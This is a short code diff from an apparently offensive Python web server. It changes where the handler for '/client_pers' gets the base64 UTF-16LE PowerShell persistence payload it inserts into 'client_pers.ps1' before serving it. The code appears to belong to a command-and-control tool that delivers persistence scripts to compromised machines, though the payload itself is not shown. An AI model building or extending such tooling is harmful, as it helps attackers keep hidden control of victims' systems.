@@ -65,7 +65,7 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
         elif self.path == '/client_pers':
             try:
                 file_to_open = open('client_pers.ps1','r').read()
-                file_to_open = file_to_open.replace('BASE64_ENCODED_PAYLOAD_UTF16LE',client.persistence['BASE64_ENCODED_PAYLOAD_UTF16LE'])
+                file_to_open = file_to_open.replace('BASE64_ENCODED_PAYLOAD_UTF16LE',config.persistence['BASE64_ENCODED_PAYLOAD_UTF16LE'])
                 self.send_response(200)
                 self.send_header('Content-type', 'text')
                 self.end_headers()
